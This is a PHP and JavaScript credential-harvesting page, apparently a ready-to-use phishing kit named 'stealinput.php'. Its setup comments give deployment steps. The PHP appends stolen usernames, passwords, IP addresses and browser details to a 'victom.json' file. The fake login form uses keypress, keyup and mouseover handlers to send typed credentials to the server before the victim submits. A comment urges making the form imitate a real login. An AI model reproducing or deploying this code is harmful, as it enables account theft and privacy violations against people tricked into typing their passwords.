<?php
# create victom.json
# chmod 777 victom.json
# u can change victom.json anywhere 
# upload stealinput.php to your localhost/stealinput.php 

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$r = $_SERVER['HTTP_REFERER'];
$d = date ("d.m.Y|h:i:s");
if (isset($_POST) == 1) {
    foreach ($_POST as $key => $value) {
        $xjos = json_decode($key);
        $user = $xjos->username;
        $pass = $xjos->password;
    }
    $tx = "$d : USER: $user | PWD: $pass | $ip - $ua - $r ";
    $fp = fopen('victom.json', 'a+');
    fwrite($fp, $tx . "\n");
    fclose($fp);
} 
?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!-- FROM HERE PLAY AROUND - FAKE IT - CHANGE IT -->
<form method="POST" onmouseover="javascript:g0l0g()" action="">
<input id="LoginUserName" name="LoginUserName" type="text" onkeypress="javascript:g0l0g()">
<input id="LoginPassWord" name="LoginPassWord" type="password" onkeyup="javascript:g0l0g()">
<input type="submit" value="">
</form>
<!-- END FROM HERE PLAY AROUND - FAKE IT - CHANGE IT -->
<script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
<script>  
    var autoselect = document.getElementById('LoginUserName');
    autoselect.select();
    var STI = {
        send: function(a) {
            return new Promise(function(n, e) {
                var ts = JSON.stringify(a);
                STI.ajaxPost("index.php?", ts)
            })
        },
        ajaxPost: function(e, n, t) {
            var a = STI.CORS("POST", e);
            a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function() {
                var e = a.responseText;
                null != t && t(e)
            }, a.send(n)
        },
        CORS: function(e, n) {
            var t = new XMLHttpRequest;
            return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t
        }
    };
    function g0l0g() {
        var LoginUserName = $('#LoginUserName').val();
        var LoginPassWord = $('#LoginPassWord').val();
        STI.send({
            username: LoginUserName,
            password: LoginPassWord
        }).then(
            r3s => {
                if (r3s == 'OK') {
                    alert("good");
                } else {
                    alert("error");
                }
            }
        );
    }
</script>
